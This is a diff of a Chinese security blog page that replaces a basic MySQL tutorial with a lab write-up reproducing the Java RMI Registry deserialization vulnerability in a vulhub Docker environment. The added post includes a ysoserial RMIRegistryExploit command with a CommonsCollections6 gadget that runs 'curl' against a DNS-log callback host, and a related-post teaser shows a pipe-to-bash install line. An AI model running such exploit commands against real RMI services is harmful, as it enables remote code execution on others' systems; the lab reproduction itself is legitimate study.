@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="数据库基本使用, DDD.wiki">
+    <meta name="keywords" content="Java RMI Registry 反序列化漏洞, DDD.wiki">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>数据库基本使用 | DDD.wiki</title>
+    <title>Java RMI Registry 反序列化漏洞 | DDD.wiki</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -219,7 +219,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">数据库基本使用</h1>
+                    <h1 class="description center-align post-title">Java RMI Registry 反序列化漏洞</h1>
                 </div>
             </div>
         </div>
@@ -336,23 +336,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/MySQL/">
-                                <span class="chip bg-color">MySQL</span>
+                            <a href="/tags/cve/">
+                                <span class="chip bg-color">cve</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-category">
-                                数据库
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -361,7 +352,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-02
+                    2020-07-15
                 </div>
                 
 
@@ -370,7 +361,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    600
+                    261
                 </div>
                 
 
@@ -387,139 +378,24 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>其他的数据库还没用过，就在这里先记录一下MySQL数据库的基本操作吧。我有点怀疑我为什么要写这个了。随便百度都能百度到的东西，我跪了（没办法，我是真的菜鸡）。</p>
-<h2 id="数据库的基本用法"><a href="#数据库的基本用法" class="headerlink" title="数据库的基本用法"></a>数据库的基本用法</h2><p>数据库的种类有很多，也有对应的图形化管理界面，但还是要掌握使用命令来对数据库进行操作。</p>
-<p>由于平常自己也很少使用数据库，现在只记录一些最基本的用法。</p>
-<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>登录数据库；</p>
-<pre><code class="shell">mysql -u root -p</code></pre>
-<p>查看数据库；</p>
-<pre><code class="shell">mysql&gt; show databases;   
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| app                |
-| mysql              |
-| performance_schema |
-| sys                |
-+--------------------+
-5 rows in set (0.00 sec)</code></pre>
-<p>删除app数据库；</p>
-<pre><code class="shell">mysql&gt; drop database app;
-Query OK, 0 rows affected (0.00 sec)
+                <h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).</p>
+<h2 id="搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。"><a href="#搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。" class="headerlink" title="搭建Java RMI Registry环境，RMIIP为虚拟机IP。"></a>搭建Java RMI Registry环境，RMIIP为虚拟机IP。</h2><pre><code>cd /root/vulhub/java/rmi-registry-bind-deserialization/
+docker-compose build
+# 启动环境
+docker-compose run -e RMIIP=192.168.1.160 -p 1099:1099 rmi</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code># 在ysoserial目录下执行
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.160.128 1099 CommonsCollections6 &quot;curl http://hq7rcl.dnslog.cn&quot;</code></pre><p>在线查询连接请求。在线工具：<a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p>
+<p><img src="https://s1.ax1x.com/2020/07/15/U0nWMn.png" alt="U0nWMn.png"></p>
+<p>连接结果</p>
+<p><img src="https://s1.ax1x.com/2020/07/15/U0nhq0.png" alt="U0nhq0.png"></p>
+<p>执行创建文件的命令</p>
+<p><img src="https://s1.ax1x.com/2020/07/15/U0nXs1.png" alt="U0nXs1.png"></p>
+<p>查看docker中创建的文件。</p>
+<p><img src="https://s1.ax1x.com/2020/07/15/U0njqx.png" alt="U0njqx.png"></p>
+<p>漏洞复现成功。</p>
+<p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization</a></p>
+<p>​                  <a href="https://blog.csdn.net/JiangBuLiu/article/details/95492587" target="_blank" rel="noopener">https://blog.csdn.net/JiangBuLiu/article/details/95492587</a></p>
+<p>​                  <a href="https://vulhub.org/#/environments/jmeter/CVE-2018-1297/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jmeter/CVE-2018-1297/</a></p>
 
-mysql&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-| sys                |
-+--------------------+
-4 rows in set (0.00 sec)</code></pre>
-<p>创建app数据库；</p>
-<pre><code class="shell">mysql&gt; create database app;
-Query OK, 1 row affected (0.00 sec)
-
-mysql&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| app                |
-| mysql              |
-| performance_schema |
-| sys                |
-+--------------------+
-5 rows in set (0.00 sec)</code></pre>
-<p>选择数据库，查看数据库中的表；</p>
-<pre><code class="shell">use app;    
-show tables;   </code></pre>
-<p>选择数据库，创建一个新表，插入一行新数据；</p>
-<pre><code class="shell">mysql&gt; use app;
-Database changed
-mysql&gt; create table table_name(id int,username varchar(50),password varchar(50));
-Query OK, 0 rows affected (0.01 sec)
-
-mysql&gt; select * from table_name;
-Empty set (0.00 sec)
-
-mysql&gt; insert into table_name(id,username,password) values(1,&#39;root&#39;,&#39;toor&#39;);
-Query OK, 1 row affected (0.00 sec)
-
-mysql&gt; select * from table_name;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    1 | root     | toor     |
-+------+----------+----------+
-1 row in set (0.00 sec)</code></pre>
-<p>插入多行新数据；</p>
-<pre><code class="shell">mysql&gt; insert into table_name(id,username,password) values(2,&#39;admin&#39;,&#39;admin123&#39;),(3,&#39;sysadm&#39;,&#39;admin456&#39;),(4,&#39;secadm&#39;,&#39;secadm&#39;);
-Query OK, 3 rows affected (0.01 sec)
-Records: 3  Duplicates: 0  Warnings: 0
-
-mysql&gt; select * from table_name;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    1 | root     | toor     |
-|    2 | admin    | admin123 |
-|    3 | sysadm   | admin456 |
-|    4 | secadm   | secadm   |
-+------+----------+----------+
-4 rows in set (0.00 sec)</code></pre>
-<p>更新表中的字段内容；</p>
-<pre><code class="shell">mysql&gt; update table_name set password=&#39;123456&#39; where id=4;
-Query OK, 1 row affected (0.00 sec)
-Rows matched: 1  Changed: 1  Warnings: 0
-
-mysql&gt; select * from table_name;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    1 | root     | toor     |
-|    2 | admin    | admin123 |
-|    3 | sysadm   | admin456 |
-|    4 | secadm   | 123456   |
-+------+----------+----------+
-4 rows in set (0.00 sec)
-
-mysql&gt; select * from table_name where id=4;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    4 | secadm   | 123456   |
-+------+----------+----------+
-1 row in set (0.00 sec)
-
-mysql&gt; select * from table_name;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    1 | root     | toor     |
-|    2 | admin    | admin123 |
-|    3 | sysadm   | admin456 |
-|    4 | secadm   | 123456   |
-+------+----------+----------+
-4 rows in set (0.00 sec)</code></pre>
-<p>删除一行数据；</p>
-<pre><code class="shell">mysql&gt; delete from table_name where id=3;
-Query OK, 1 row affected (0.01 sec)
-
-mysql&gt; select * from table_name;
-+------+----------+----------+
-| id   | username | password |
-+------+----------+----------+
-|    1 | root     | toor     |
-|    2 | admin    | admin123 |
-|    4 | secadm   | 123456   |
-+------+----------+----------+
-3 rows in set (0.00 sec)
-mysql&gt; exit
-Bye</code></pre>
-<h3 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a>SQL server</h3><h3 id="access"><a href="#access" class="headerlink" title="access"></a>access</h3><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3>
             </div>
             <hr/>
 
@@ -544,7 +420,7 @@ Bye</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://827607240.github.io/2020/03/02/mysql-1/">https://827607240.github.io/2020/03/02/mysql-1/</a>
+                    <a href="https://827607240.github.io/2020/07/15/Java-RMI-Registry/">https://827607240.github.io/2020/07/15/Java-RMI-Registry/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -582,8 +458,8 @@ Bye</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/MySQL/">
-                                    <span class="chip bg-color">MySQL</span>
+                                <a href="/tags/cve/">
+                                    <span class="chip bg-color">cve</span>
                                 </a>
                             
                         </div>
@@ -892,38 +768,31 @@ Bye</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/03/03/Nmap/">
+                <a href="/2020/07/15/Tomcat-PUT%EF%BC%88CVE-2017-12615%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Nmap使用参数记录">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）">
                         
-                        <span class="card-title">Nmap使用参数记录</span>
+                        <span class="card-title">Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            nmap，端口扫描神器。但是扫描速度有点慢。
-nmap的使用nmap介绍Nmap — 网络探测工具和安全/端口扫描器。
-nmap常用参数ping扫描
-nmap -sP 192.168.0.1/24
-SYN扫描（半开扫描）
-nmap -sS 
+                            Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）Tomcat版本：8.5.19
+环境搭建docker-compose build
+docker-compose up -d运行完成后访问http://your-ip:80
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-03
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-15
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Nmap/" class="post-category">
-                                    Nmap
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            DDD
                             
                         </span>
                     </div>
@@ -931,16 +800,8 @@ nmap -sS
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Nmap/">
-                        <span class="chip bg-color">Nmap</span>
-                    </a>
-                    
-                    <a href="/tags/Windows/">
-                        <span class="chip bg-color">Windows</span>
-                    </a>
-                    
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/cve/">
+                        <span class="chip bg-color">cve</span>
                     </a>
                     
                 </div>
@@ -954,35 +815,30 @@ nmap -sS
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/01/sqlmap-2/">
+                <a href="/2020/07/14/fastjson1-2-24/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="记一次完整的SQL注入">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="fastjson 1.2.24 反序列化导致任意命令执行漏洞">
                         
-                        <span class="card-title">记一次完整的SQL注入</span>
+                        <span class="card-title">fastjson 1.2.24 反序列化导致任意命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这是之前学习SQLMAP时做过的记录，第一次使用SQL注入获取用户密码，当时还是挺激动的，虽然这个很简单。存粹的学习记录，把一些试错的过程删掉了。
-SQLMAP注入首先查找到注入点，用sqlmap进行注入。
-sqlmap.py -u &qu
+                            fastjson 1.2.24 反序列化导致任意命令执行漏洞ubuntu安装curl。apt install curl
+docker环境部署下载安装dockercurl -fsSL https://get.docker.com | bash
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-14
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/SQLMap/" class="post-category">
-                                    SQLMap
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            DDD
                             
                         </span>
                     </div>
@@ -990,16 +846,8 @@ sqlmap.py -u &qu
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                    <a href="/tags/SQLMap/">
-                        <span class="chip bg-color">SQLMap</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
-                        <span class="chip bg-color">数据库</span>
+                    <a href="/tags/cve/">
+                        <span class="chip bg-color">cve</span>
                     </a>
                     
                 </div>
